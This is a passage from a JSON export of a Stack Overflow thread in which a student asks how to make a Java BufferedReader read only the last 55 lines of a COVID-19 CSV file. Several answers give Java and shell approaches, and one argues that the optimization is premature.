startIndex; i &lt; lines.size(); i++) {\n                extractedLines.add(lines.get(i));\n            }\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        return extractedLines.toArray(new String[0]);\n    }\n}\n</code></pre>\n<p>In this sample codes, I'm reading all lines into an pre-initialized ArrayList of string and extracting the last certain lines to a String list (<code>String[]</code>). You can use this as a tool class of your program. In this case this reads all lines and stores. So it will use a lot of computer memory as your csv has  60 000 lines.</p>\n<p><code>noOfLinesToReadFromEnd</code> is the number of lines you need to read from the end of the csv. In your case it's 55.</p>\n<h1>Method 2: Use Apache Commons IO <code>ReversedLinesFileReader</code> and read first 55 lines.</h1>\n<p>You can use Apache Commons IO ReversedLinesFileReader to this. Then read it like you're reading first 55 lines of the CSV. But in this case you'll get last line first and ... Of course you can use Reserve the lines again and read it.</p>\n<pre><code>public class ReadCertainLinesCommons {\n\n    ReadCertainLinesCommons() {\n\n        String csvFile = &quot;path to csv file&quot;;\n        int noOfLinesToReadFromEnd = 10;\n\n                String[] last_10 = extractLines(readLines, noOfLinesToReadFromEnd);\n    System.out.println(Arrays.toString(last_10));\n\n    }\n\n    public static void main(String[] args) {\n        new ReadCertainLinesCommons();\n    }\n\n    public String[] ReadLastCertainLinesWithCommons(String csvFile, int lastLinesToKeep) {\n\n        ArrayList&lt;String&gt; toWhichArray = new ArrayList&lt;&gt;(lastLinesToKeep);\n\n        try (ReversedLinesFileReader reader = new ReversedLinesFileReader(new File(csvFile), Charset.defaultCharset())) {\n\n            // Read the last 10 lines\n            String line;\n            int lineCount = 0;\n\n            while ((line = reader.readLine()) != null &amp;&amp; lineCount &lt;= lastLinesToKeep - 1) {\n\n                String[] values = line.split(&quot;,&quot;);\n                toWhichArray.add(Arrays.toString(values));\n\n                lineCount++;\n            }\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        return toWhichArray.toArray(new String[0]);\n    }\n}\n</code></pre>\n<p>This code uses the <code>ReversedLinesFileReader</code> class to read the CSV file in reverse order, starting from the end of the file. It then reads the last 10 lines of the file and adds them to a ArrayList object. It converts it to a String List. Finally, it prints out the last 10 lines. Note that the lines are added to the String List in reverse order, so they need to be reversed again before printing them out. I did it too. (Look at the code)</p>\n<p>I've another example of using <code>ReversedLinesFileReader</code>. It doesn't process a split at all. So it's more quicker.</p>\n<pre><code>public class ReadLast10LinesCSV {\n \n    public static void main(String[] args) {\n \n        String csvFile = &quot;your_file.csv&quot;;\n        List&lt;String&gt; lines = new ArrayList&lt;&gt;();\n        int linesToKeep = 10;\n \n        try (BufferedReader br = new BufferedReader(new FileReader(csvFile))) {\n \n            String line;\n \n            // Read all lines from the CSV file\n            while ((line = br.readLine()) != null) {\n                lines.add(line);\n            }\n \n            // Keep only the last 10 lines\n            int startIndex = lines.size() &gt; linesToKeep ? lines.size() - linesToKeep : 0;\n            for (int i = startIndex; i &lt; lines.size(); i++) {\n                System.out.println(lines.get(i));\n            }\n \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>\n<p>Note that this method will be much quicker as it doesn't read all the lines of csv. (Thanks to @StephenC)</p>\n<h1>Method 3: Using <code>java.io.RandomAccessFile</code></h1>\n<p>This is the most appropriate and most quickest way. It is the most powerful way when comparing the three methods.</p>\n<p>Why: It doesn't read all the lines as first method.\nIt doesn't need to reverse order the lines twice as the second method.\nIt doesn't need splitting lines as method 1 - example 1 and method 2 - example 1.</p>\n<p>So thanks to @StephenC for giving me the idea.</p>\n<p>Please note that this's isn't a great util class yet. I'll improve it.</p>\n<pre><code>public class ReadCertainLines_Best {\n    ReadCertainLines_Best() {\n        String csvFile = &quot;your csv file here&quot;;\n        int linesToKeep = 10;\n\n        printThem(ReadCertainLines(csvFile, linesToKeep));\n    }\n\n    public static void main(String[] args) {\n        new ReadCertainLines_Best();\n    }\n\n    public HashMap&lt;String, Object&gt; ReadCertainLines(String csvFile, int linesToKeep) {\n        byte[] buffer = new byte[1024];\n        StringBuilder sb = new StringBuilder();\n\n        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();\n\n        try (RandomAccessFile file = new RandomAccessFile(csvFile, &quot;r&quot;)) {\n\n            // Find the last line ending position\n            long fileLength = file.length();\n            long filePointer = fileLength - 1;\n            int lineCount = 0;\n\n            while (filePointer &gt;= 0 &amp;&amp; lineCount &lt; linesToKeep) {\n                file.seek(filePointer);\n                byte c = file.readByte();\n\n                if (c == '\\n' || c == '\\r') {\n                    lineCount++;\n                }\n\n                filePointer--;\n            }\n\n            // Read the last 10 lines\n            while (true) {\n                int bytesRead = file.read(buffer);\n\n                if (bytesRead == -1) {\n                    break;\n                }\n\n                for (int i = 0; i &lt; bytesRead; i++) {\n                    sb.append((char) buffer[i]);\n                }\n            }\n\n            String[] lines = sb.toString().split(&quot;\\n&quot;);\n\n            // Print the last 10 lines\n            int startIndex = lines.length &gt; linesToKeep ? lines.length - linesToKeep : 0;\n\n            map.put(&quot;startIndex&quot;, startIndex);\n            map.put(&quot;length&quot;, lines.length);\n            map.put(&quot;lines&quot;, lines);\n\n//            for (int i = startIndex; i &lt; lines.length; i++) {\n//                System.out.println(lines[i]);\n//            }\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        return map;\n    }\n\n    public void printThem(HashMap&lt;String, Object&gt; map) {\n        for (int i = (int) map.get(&quot;startIndex&quot;); i &lt; (int) map.get(&quot;length&quot;); i++) {\n            System.out.println(((String[]) map.get(&quot;lines&quot;))[i]);\n        }\n    }\n}\n</code></pre>\n<p>This code uses the <code>RandomAccessFile</code> class to seek to the end of the file, and then moves backwards through the file, counting the number of line breaks it encounters until it has found the last certain number of lines. It then reads those lines into a StringBuilder object and splits them into an array of individual lines. It creates a HashMap and passes lines, startIndex and the length of the String List. And print with the help of a for loop. This's neither yet great as a util class nor described well. But It works and it'll update the answer soon.</p>\n"},{"tags":[],"owner":{"account_id":5617137,"reputation":538,"user_id":6505930,"display_name":"justnisar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1682932485,"creation_date":1682903119,"answer_id":76144267,"question_id":76140064,"body_markdown":"If you are using terminal, you can get the number of lines in a file by using the command. You can also get this by manually looking at the file.\r\n\r\n    wc -l file_interested_in\r\n   \r\nIn your java code where you are reading the file line by line, ignore all the lines except the last 55.\r\n\r\n\r\n        String str = null;\r\n        int currentLine = 0;\r\n        while((str = br.readLine()) != null){\r\n            currentLine++;\r\n            if(totalLineCount - currentLine &lt; 55){\r\n                // Lines you are interested in\r\n            }\r\n        }\r\n\r\nAs an alternative extract the last 55 lines of your file in the terminal:\r\n\r\n    tail -55 file_intersted_in &gt; relevant_lines\r\n\r\nNow feed the `relevant_lines` files into your Java program and have it simply process all lines.\r\n","title":"How can I get Buffered Reader to read only certain lines of a csv txt file?","body":"<p>If you are using terminal, you can get the number of lines in a file by using the command. You can also get this by manually looking at the file.</p>\n<pre><code>wc -l file_interested_in\n</code></pre>\n<p>In your java code where you are reading the file line by line, ignore all the lines except the last 55.</p>\n<pre><code>    String str = null;\n    int currentLine = 0;\n    while((str = br.readLine()) != null){\n        currentLine++;\n        if(totalLineCount - currentLine &lt; 55){\n            // Lines you are interested in\n        }\n    }\n</code></pre>\n<p>As an alternative extract the last 55 lines of your file in the terminal:</p>\n<pre><code>tail -55 file_intersted_in &gt; relevant_lines\n</code></pre>\n<p>Now feed the <code>relevant_lines</code> files into your Java program and have it simply process all lines.</p>\n"},{"tags":[],"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1682906495,"creation_date":1682904879,"answer_id":76144335,"question_id":76140064,"body_markdown":"&gt; Is there any way for me to have my Buffered Reader only read the last 55 lines of the file?\r\n\r\nYes, there are ways; see the other answers.\r\n\r\nBut I think this is *premature optimization*.  Yes, reading and skipping 60,000 lines is going to be inefficient&lt;sup&gt;1&lt;/sup&gt;.  But here&#39;s the thing.  Unless the project requirements include something that says that the code must run in under N seconds or must be &quot;as fast as possible&quot;, you can make the argument the code only needs to be *reasonably* fast.  It should only take a couple of seconds&lt;sup&gt;2&lt;/sup&gt; to read and skip 60,000 lines.  That is reasonable (IMO).\r\n\r\nSo ...\r\n\r\nAssuming that there are no stated performance goals / requirements, my advice would be to write the code the simplest way to start with.  Then measure how long it takes to run the code ... and decide whether it is *worth the effort* to optimize the code by (say) reading the file in reverse.\r\n\r\n--------------------\r\n\r\n&lt;sup&gt;1 - Inefficient in terms of execution time.  But probably more efficient in terms of *programmer* time.  And even for student programmers, time spent optimizing code unnecessarily is time that *could* be spent on something *more productive*.&lt;br&gt;\r\n2 - Probably a lot less than that, though it will depend on a few factors that we don&#39;t need to go into here.\r\n&lt;/sup&gt;","title":"How can I get Buffered Reader to read only certain lines of a csv txt file?","body":"<blockquote>\n<p>Is there any way for me to have my Buffered Reader only read the last 55 lines of the file?</p>\n</blockquote>\n<p>Yes, there are ways; see the other answers.</p>\n<p>But I think this is <em>premature optimization</em>.  Yes, reading and skipping 60,000 lines is going to be inefficient<sup>1</sup>.  But here's the thing.  Unless the project requirements include something that says that the code must run in under N seconds or must be &quot;as fast as possible&quot;, you can make the argument the code only needs to be <em>reasonably</em> fast.  It should only take a couple of seconds<sup>2</sup> to read and skip 60,000 lines.  That is reasonable (IMO).</p>\n<p>So ...</p>\n<p>Assuming that there are no stated performance goals / requirements, my advice would be to write the code the simplest way to start with.  Then measure how long it takes to run the code ... and decide whether it is <em>worth the effort</em> to optimize the code by (say) reading the file in reverse.</p>\n<hr />\n<p><sup>1 - Inefficient in terms of execution time.  But probably more efficient in terms of <em>programmer</em> time.  And even for student programmers, time spent optimizing code unnecessarily is time that <em>could</em> be spent on something <em>more productive</em>.<br>\n2 - Probably a lot less than that, though it will depend on a few factors that we don't need to go into here.\n</sup></p>\n"},{"tags":[],"owner":{"account_id":22124137,"reputation":3297,"user_id":16376827,"display_name":"g00se"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1682933425,"creation_date":1682933425,"answer_id":76145926,"question_id":76140064,"body_markdown":"If you want to use the date filtering method mentioned by @Ole V.V, you can do something like:\r\n\r\n    import java.time.LocalDate;\r\n    import java.time.Month;\r\n    import java.util.stream.Collectors;\r\n    import java.util.List;\r\n    import java.nio.file.Path;\r\n    import java.nio.file.Files;\r\n    \r\n    public class CStats {\r\n        public static void main(String[] args) {\r\n            try {\r\n                final LocalDate REF_DATE = LocalDate.parse(args[0]);\r\n                List&lt;StateCovidStats&gt; statesStats = Files.lines(Path.of(args[1]))\r\n                    .skip(1)\r\n                    .map(line -&gt;line.split(&quot;,&quot;))\r\n                    .filter(a -&gt;LocalDate.parse(a[0]).isAfter(REF_DATE))\r\n                    .map(StateCovidStats::fromCsv)\r\n                    .collect(Collectors.toList());\r\n                statesStats.stream()\r\n                    .forEach(System.out::println);\r\n            }\r\n            catch(Throwable t) {\r\n                t.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n\r\nI did `java CStats 2023-03-22 us-states.csv`, with data I found with exactly the same headers, and it printed the last 56 lines.","title":"How can I get Buffered Reader to read only certain lines of a csv txt file?","body":"<p>If you want to use the date filtering method mentioned by @Ole V.V, you can do something like:</p>\n<pre><code>import java.time.LocalDate;\nimport java.time.Month;\nimport java.util.stream.Collectors;\nimport java.util.List;\nimport java.nio.file.Path;\nimport java.nio.file.Files;\n\npublic class CStats {\n    public static void main(String[] args) {\n        try {\n            final LocalDate REF_DATE = LocalDate.parse(args[0]);\n            List&lt;StateCovidStats&gt; statesStats = Files.lines(Path.of(args[1]))\n                .skip(1)\n                .map(line -&gt;line.split(&quot;,&quot;))\n                .filter(a -&gt;LocalDate.parse(a[0]).isAfter(REF_DATE))\n                .map(StateCovidStats::fromCsv)\n                .collect(Collectors.toList());\n            statesStats.stream()\n                .forEach(System.out::println);\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n    }\n}\n</code></pre>\n<p>I did <code>java CStats 2023-03-22 us-states.csv</code>, with data I found with exactly the same headers, and it printed the last 56 lines.</p>\n"}],"owner":{"account_id":28461427,"reputation":1,"user_id":21778100,"display_name":"Dzubek"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":156,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":4,"score":0,"last_activity_date":1683728478,"creation_date":1682840305,"question_id":76140064,"body_markdown":"I&#39;m writing a java program for a school project that reads in data about covid-19 from a csv text file which has data in the following format:(date, state, fips code, # of cases, # of deaths). The problem is that the text file my professor gave us has over 60,000 lines of redundant data and the data I really need is on the final 55 lines of the text file. The file contains data about every single day from January 1st, 2021 to March 23rd 2023 and I only need the total amount of cases and total amount of deaths per U.S territory which essentially is located on the last 55 lines of the file. I already have most of the program working, I just need to make it so the data from those last 55 lines is read in so I can use it in some calculations. Is there any way for me to have my Buffered Reader only read the last 55 lines of the file? \r\n\r\n5/1/2023: Thanks for all the answers, but I worked out a solution on my own yesterday. I just wrapped the while loop inside an if statement that would ensure that only lines beginning with the string &quot;2023-03-23&quot; would be read into the program.\r\n\r\nHere&#39;s my code if anyone wants to look at it\r\n```\r\nimport java.io.*;\r\nimport java.util.*;\r\npublic class StateCovidStats extends State \r\n{\r\n\tprivate int cases, deaths;\r\n\t\r\n\t//default\r\n\tpublic StateCovidStats() \r\n\t{\r\n\t\t\r\n\t}\r\n\t\r\n\t//constructor\r\n\tpublic StateCovidStats(String theName, int caseCount, int deathCount) \r\n\t{\r\n\t\tsuper(theName);\r\n\t\tcases=caseCount;\r\n\t\tdeaths=deathCount;\r\n\t}\r\n\t\r\n\tpublic void displayStats() \r\n\t{\r\n\t\tSystem.out.println(&quot;----------------------------------------&quot;);\r\n\t\tSystem.out.println(this.getName()+&quot; Stats:&quot;);\r\n\t\tSystem.out.println(&quot;Cases: &quot;+this.getCases());\r\n\t\tSystem.out.println(&quot;Deaths: &quot;+this.getDeaths());\r\n\t\tSystem.out.println(&quot;----------------------------------------&quot;);\r\n\t}\r\n\t\r\n\t//getters\r\n\tpublic String getStateName() \r\n\t{\r\n\t\treturn this.getName();\r\n\t}\r\n\t\r\n\tpublic int getCases() \r\n\t{\r\n\t\treturn cases;\r\n\t}\r\n\t\r\n\tpublic int getDeaths() \r\n\t{\r\n\t\treturn deaths;\r\n\t}\r\n\t\r\n\t//setters\r\n\tpublic void setStateName(String newName) \r\n\t{\r\n\t\tthis.setName(newName);\r\n\t}\r\n\t\r\n\tpublic void setCases(int caseCount)\r\n\t{\r\n\t\tcases=caseCount;\r\n\t} \r\n\t\r\n\tpublic void setDeaths(int deathCount) \r\n\t{\r\n\t\tdeaths=deathCount;\r\n\t}\r\n\t\r\n\tpublic String toString() \r\n\t{\r\n\t\tString s=&quot;&quot;;\r\n\t\ts+=this.getStateName()+&quot; Cases: &quot;+this.getCases()+&quot; Deaths: &quot;+this.getDeaths();\r\n\t\treturn s;\r\n\t\t\r\n\t}\r\n\t\r\n\tpublic static String findMaxCases(ArrayList&lt;StateCovidStats&gt; list) \r\n\t{\r\n\t\t\r\n\t\tint greatest=Integer.MIN_VALUE;\r\n\t\tString nameOfMax=&quot;&quot;;\r\n\t\tfor(int i=0;i&lt;list.size();i++) \r\n\t\t{\r\n\t\t\tif(list.get(i).getCases()&gt;greatest) {\r\n\t\t\t\tgreatest=list.get(i).getCases();\r\n\t\t\t\tnameOfMax=list.get(i).getName();\r\n\t\t\t}\r\n\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\treturn nameOfMax;\r\n\t}\r\n\t\r\n\tpublic static String findMaxDeaths(ArrayList&lt;StateCovidStats&gt; list) \r\n\t{\r\n\t\t\r\n\t\tint greatest=Integer.MIN_VALUE;\r\n\t\tString nameOfMax=&quot;&quot;;\r\n\t\tfor(int i=0;i&lt;list.size();i++) \r\n\t\t{\r\n\t\t\tif(list.get(i).getDeaths()&gt;greatest) {\r\n\t\t\t\tgreatest=list.get(i).getDeaths();\r\n\t\t\t\tnameOfMax=list.get(i).getName();\r\n\t\t\t}\r\n\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\treturn nameOfMax;\r\n\t}\r\n\t\r\n\tpublic static String findMinCases(ArrayList&lt;StateCovidStats&gt; list) \r\n\t{\r\n\t\t\r\n\t\tint least=Integer.MAX_VALUE;\r\n\t\tString nameOfMin=&quot;&quot;;\r\n\t\tfor(int i=0;i&lt;list.size();i++) \r\n\t\t{\r\n\t\t\tif(list.get(i).getCases()&lt;least) {\r\n\t\t\t\tleast=list.get(i).getCases();\r\n\t\t\t\tnameOfMin=list.get(i).getName();\r\n\t\t\t}\r\n\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\treturn nameOfMin;\r\n\t}\r\n\t\r\n\tpublic static String findMinDeaths(ArrayList&lt;StateCovidStats&gt; list) \r\n\t{\r\n\t\t\r\n\t\tint least=Integer.MAX_VALUE;\r\n\t\tString nameOfMin=&quot;&quot;;\r\n\t\tfor(int i=0;i&lt;list.size();i++) \r\n\t\t{\r\n\t\t\tif(list.get(i).getDeaths()&lt;least) {\r\n\t\t\t\tleast=list.get(i).getDeaths();\r\n\t\t\t\tnameOfMin=list.get(i).getName();\r\n\t\t\t}\r\n\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\treturn nameOfMin;\r\n\t}\r\n\t\r\n\t\r\n\t\r\n\tpublic static void main(String[] args) \r\n\t{\r\n\t\t\r\n\t\t    //us-states-Jan-2020-through-March-2023\r\n\t\t//sampleDataOld2021\r\n\t\t    \r\n\t\r\n\t\t\r\n\t\tString line=&quot;&quot;;\r\n\t\tString start=&quot;&quot;;\r\n\t\t\r\n\t\tlong totDeath=0;\r\n\t\tlong totCase=0;\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\tArrayList&lt;StateCovidStats&gt; states=new ArrayList&lt;StateCovidStats&gt;();\r\n\t\t\r\n\t\ttry   \r\n\t\t{  \r\n\t\t \r\n\t\tBufferedReader br = new BufferedReader(new FileReader(&quot;.\\\\src\\\\/us-states-Jan-2020-through-March-2023.txt&quot;));  \r\n\r\n\t\t\r\n\t\twhile ((line = br.readLine()) != null )  \r\n\t\t\t{\r\n\t\t\t\r\n\t\tString[] covid = line.split(&quot;,&quot;);    // use comma as separator  \r\n\t\t  \r\n\t\t\r\n\t\t\r\n\t\ttotDeath+=Integer.parseInt(covid[4]);\r\n\t\ttotCase+=Integer.parseInt(covid[3]);\r\n\t\t\r\n\t\tStateCovidStats temp=new StateCovidStats(covid[1],Integer.parseInt(covid[3]),Integer.parseInt(covid[4]));\r\n\t\t\r\n\t\r\n\t\tfor(int i=0; i&lt;=states.size();i++) \r\n\t\t\t{\r\n\t\t\t\ttry\r\n\t\t\t\t{\r\n\t\t\t\tif((states.get(i).getName().equalsIgnoreCase(temp.getName()))) \r\n\t\t\t\t{\r\n\t\t\t\t\t\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\t} //end of  2nd try\r\n\t\t\t\tcatch(IndexOutOfBoundsException e) \r\n\t\t\t\t{\r\n\t\t\t\t\tstates.add(temp);\r\n\t\t\t\t\t\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}//end of for\r\n\t\t\r\n\t\t\t\t\r\n\t\t\t} //end of while\r\n\t\t\r\n\t\t\r\n\t\tbr.close();\r\n\t\t}   //end of try\r\n\t\tcatch (IOException e)   \r\n\t\t{  \r\n\t\te.printStackTrace();  \r\n\t\t}  //end of catch\r\n\t\t\r\n\t\r\n\t\t\t\r\n\t/*\t\t\r\n\t\tfor(int i=0; i&lt;states.size();i++)\r\n\t{\r\n\t\t\tSystem.out.println(states.get(i).getName());\r\n\t\t\tSystem.out.println(&quot;Cases: &quot;+states.get(i).getCases());\r\n\t\t\tSystem.out.println(&quot;Deaths: &quot;+states.get(i).getDeaths());\r\n\t\t\tSystem.out.println(&quot;------------------------------------&quot;);\r\n\t\t\t\t\t\r\n\t}\r\n\t*/\r\n\t\t//output\r\n\t\tString maxCase=findMaxCases(states);\r\n\t\tString minCase=findMinCases(states);\r\n\t\tString maxDeath=findMaxDeaths(states);\r\n\t\tString minDeath=findMinDeaths(states);\r\n\t\tint maxCaseNum=0;\r\n\t\tint minCaseNum=0;\r\n\t\tint maxDeathNum=0;\r\n\t\tint minDeathNum=0;\r\n\t\t\r\n\t\tfor(int i=0; i&lt;states.size();i++) \r\n\t\t{\r\n\r\n\t\t\tif(states.get(i).getName().equals(&quot;New Jersey&quot;)) \r\n\t\t\t{\r\n\t\t\t\tstates.get(i).displayStats();\r\n\t\t\t}\r\n\t\t\tif(states.get(i).getName().equals(maxCase)) \r\n\t\t\t{\r\n\t\t\t\tmaxCaseNum=states.get(i).getCases();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif(states.get(i).getName().equals(minCase)) \r\n\t\t\t{\r\n\t\t\t\t minCaseNum=states.get(i).getCases();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif(states.get(i).getName().equals(maxDeath)) \r\n\t\t\t{\r\n\t\t\t\t maxDeathNum=states.get(i).getDeaths();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif(states.get(i).getName().equals(minDeath)) \r\n\t\t\t{\r\n\t\t\t\t minDeathNum=states.get(i).getDeaths();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\tSystem.out.println(&quot;State With Most Cases: &quot;+maxCase+&quot;, &quot;+maxCaseNum+&quot; Cases&quot;);\r\n\t\tSystem.out.println(&quot;State With Least Cases: &quot;+minCase+&quot;, &quot;+minCaseNum+&quot; Cases&quot;);\r\n\t\tSystem.out.println(&quot;State With Most Deaths: &quot;+maxDeath+&quot;, &quot;+maxDeathNum+&quot; Deaths&quot;);\r\n\t\tSystem.out.println(&quot;State With Least Deaths: &quot;+minDeath+&quot;, &quot;+minDeathNum+&quot; Deaths&quot;);\t\t\t\r\n\t\tSystem.out.println(&quot;Total US Cases: &quot;+totCase);\r\n\t\tSystem.out.println(&quot;Total US Deaths: &quot;+totDeath);\r\n\t\tSystem.out.println(&quot;------------------------------------&quot;);\r\n\t\tSystem.out.println(&quot;AVG State Cases: &quot;+totCase/55);\r\n\t\tSystem.out.println(&quot;AVG State Deaths: &quot;+totDeath/55);\r\n\t\t\r\n\t\tfor(int i=0; i&lt;states.size();i++) \r\n\t\t{\r\n\r\n\t\t\tif(states.get(i).getName().equals(&quot;New Jersey&quot;)) \r\n\t\t\t{\r\n\t\t\t\tstates.get(i).displayStats();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t}\t//end of main\r\n} //end of class\r\n\r\n```\r\n\r\n\r\n\r\n\r\n\r\n```\r\n\r\npublic class State \r\n{\r\n\t\r\n\t\tprivate String stateName,timeZone;\r\n\t\tprivate int population;\r\n\t\tprivate double density;\r\n\t\t\r\n\t\t\r\n\t\t//default constructor\r\n\t\tpublic State()\r\n\t\t{\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\t//constructor\r\n\t\tpublic State(String theName) \r\n\t\t{\r\n\t\t\tstateName=theName;\r\n\t\t}\r\n\t\t\r\n\t\t//name getter+setter\r\n\t\tpublic String getName() \r\n\t\t{\r\n\t\t\treturn stateName;\r\n\t\t}\r\n\t\t\r\n\t\tpublic void setName(String theName) \r\n\t\t{\r\n\t\t\tstateName=theName;\r\n\t\t}\r\n\t\r\n}\r\n\r\n```\r\n\r\n","title":"How can I get Buffered Reader to read only certain lines of a csv txt file?","body":"<p>I'm writing a java program for a school project that reads in data about covid-19 from a csv text file which has data in the following format:(date, state, fips code, # of cases, # of deaths). The problem is that the text file my professor gave us has over 60,000 lines of redundant data and the data I really need is on the final 55 lines of the text file. The file contains data about every single day from January 1st, 2021 to March 23rd 2023 and I only need the total amount of cases and total amount of deaths per U.S territory which essentially is located on the last 55 lines of the file. I already have most of the program working, I just need to make it so the data from those last 55 lines is read in so I can use it in some calculations. Is there any way for me to have my Buffered Reader only read the last 55 lines of the file?</p>\n<p>5/1/2023: Thanks for all the answers, but I worked out a solution on my own yesterday. I just wrapped the while loop inside an if statement that would ensure that only lines beginning with the string &quot;2023-03-23&quot; would be read into the program.</p>\n<p>Here's my code if anyone wants to look at it</p>\n<pre><code>import java.io.*;\nimport java.util.*;\npublic class StateCovidStats extends State \n{\n    private int cases, deaths;\n    \n    //default\n    public StateCovidStats() \n    {\n        \n    }\n    \n    //constructor\n    public StateCovidStats(String theName, int caseCount, int deathCount) \n    {\n        super(theName);\n        cases=caseCount;\n        deaths=deathCount;\n    }\n    \n    public void displayStats() \n    {\n        System.out.println(&quot;----------------------------------------&quot;);\n        System.out.println(this.getName()+&quot; Stats:&quot;);\n        System.out.println(&quot;Cases: &quot;+this.getCases());\n        System.out.println(&quot;Deaths: &quot;+this.getDeaths());\n        System.out.println(&quot;----------------------------------------&quot;);\n    }\n    \n    //getters\n    public String getStateName() \n    {\n        return this.getName();\n    }\n    \n    public int getCases() \n    {\n        return cases;\n    }\n    \n    public int getDeaths() \n    {\n        return deaths;\n    }\n    \n    //setters\n    public void setStateName(String newName) \n    {\n        this.setName(newName);\n    }\n    \n    public void setCases(int caseCount)\n    {\n        cases=caseCount;\n    } \n    \n    public void setDeaths(int deathCount) \n    {\n        deaths=deathCount;\n    }\n    \n    public String toString() \n    {\n        String s=&quot;&quot;;\n        s+=this.getStateName()+&quot; Cases: &quot;+this.getCases()+&quot; Deaths: &quot;+this.getDeaths();\n        return s;\n        \n    }\n    \n    public static String findMaxCases(ArrayList&lt;StateCovidStats&gt; list) \n    {\n        \n        int greatest=Integer.MIN_VALUE;\n        String nameOfMax=&quot;&quot;;\n        for(int i=0;i&lt;list.size();i++) \n        {\n            if(list.get(i).getCases()&gt;greatest) {\n                greatest=list.get(i).getCases();\n                nameOfMax=list.get(i).getName();\n            }\n                \n        }\n        \n        return nameOfMax;\n    }\n    \n    public static String findMaxDeaths(ArrayList&lt;StateCovidStats&gt; list) \n    {\n        \n        int greatest=Integer.MIN_VALUE;\n        String nameOfMax=&quot;&quot;;\n        for(int i=0;i&lt;list.size();i++) \n        {\n            if(list.get(i).getDeaths()&gt;greatest) {\n                greatest=list.get(i).getDeaths();\n                nameOfMax=list.get(i).getName();\n            }\n                \n        }\n        \n        return nameOfMax;\n    }\n    \n    public static String findMinCases(ArrayList&lt;StateCovidStats&gt; list) \n    {\n        \n        int least=Integer.MAX_VALUE;\n        String nameOfMin=&quot;&quot;;\n        for(int i=0;i&lt;list.size();i++) \n        {\n            if(list.get(i).getCases()&lt;least) {\n                least=list.get(i).getCases();\n                nameOfMin=list.get(i).getName();\n            }\n                \n        }\n        \n        return nameOfMin;\n    }\n    \n    public static String findMinDeaths(ArrayList&lt;StateCovidStats&gt; list) \n    {\n        \n        int least=Integer.MAX_VALUE;\n        String nameOfMin=&quot;&quot;;\n        for(int i=0;i&lt;list.size();i++) \n        {\n            if(list.get(i).getDeaths()&lt;least) {\n                least=list.get(i).getDeaths();\n                nameOfMin=list.get(i).getName();\n            }\n                \n        }\n        \n        return nameOfMin;\n    }\n    \n    \n    \n    public static void main(String[] args) \n    {\n        \n            //us-states-Jan-2020-through-March-2023\n        //sampleDataOld2021\n            \n    \n        \n        String line=&quot;&quot;;\n        String start=&quot;&quot;;\n        \n        long totDeath=0;\n        long totCase=0;\n        \n        \n        \n        ArrayList&lt;StateCovidStats&gt; states=new ArrayList&lt;StateCovidStats&gt;();\n        \n        try   \n        {  \n         \n        BufferedReader br = new BufferedReader(new FileReader(&quot;.\\\\src\\\\/us-states-Jan-2020-through-March-2023.txt&quot;));  \n\n        \n        while ((line = br.readLine()) != null )  \n            {\n            \n        String[] covid = line.split(&quot;,&quot;);    // use comma as separator  \n          \n        \n        \n        totDeath+=Integer.parseInt(covid[4]);\n        totCase+=Integer.parseInt(covid[3]);\n        \n        StateCovidStats temp=new StateCovidStats(covid[1],Integer.parseInt(covid[3]),Integer.parseInt(covid[4]));\n        \n    \n        for(int i=0; i&lt;=states.size();i++) \n            {\n                try\n                {\n                if((states.get(i).getName().equalsIgnoreCase(temp.getName()))) \n                {\n                    \n                    break;\n                }\n                \n                } //end of  2nd try\n                catch(IndexOutOfBoundsException e) \n                {\n                    states.add(temp);\n                    \n                    break;\n                }\n            }//end of for\n        \n                \n            } //end of while\n        \n        \n        br.close();\n        }   //end of try\n        catch (IOException e)   \n        {  \n        e.printStackTrace();  \n        }  //end of catch\n        \n    \n            \n    /*      \n        for(int i=0; i&lt;states.size();i++)\n    {\n            System.out.println(states.get(i).getName());\n            System.out.println(&quot;Cases: &quot;+states.get(i).getCases());\n            System.out.println(&quot;Deaths: &quot;+states.get(i).getDeaths());\n            System.out.println(&quot;------------------------------------&quot;);\n                    \n    }\n    */\n        //output\n        String maxCase=findMaxCases(states);\n        String minCase=findMinCases(states);\n        String maxDeath=findMaxDeaths(states);\n        String minDeath=findMinDeaths(states);\n        int maxCaseNum=0;\n        int minCaseNum=0;\n        int maxDeathNum=0;\n        int minDeathNum=0;\n        \n        for(int i=0; i&lt;states.size();i++) \n        {\n\n            if(states.get(i).getName().equals(&quot;New Jersey&quot;)) \n            {\n                states.get(i).displayStats();\n            }\n            if(states.get(i).getName().equals(maxCase)) \n            {\n                maxCaseNum=states.get(i).getCases();\n            }\n            \n            if(states.get(i).getName().equals(minCase)) \n            {\n                 minCaseNum=states.get(i).getCases();\n            }\n            \n            if(states.get(i).getName().equals(maxDeath)) \n            {\n                 maxDeathNum=states.get(i).getDeaths();\n            }\n            \n            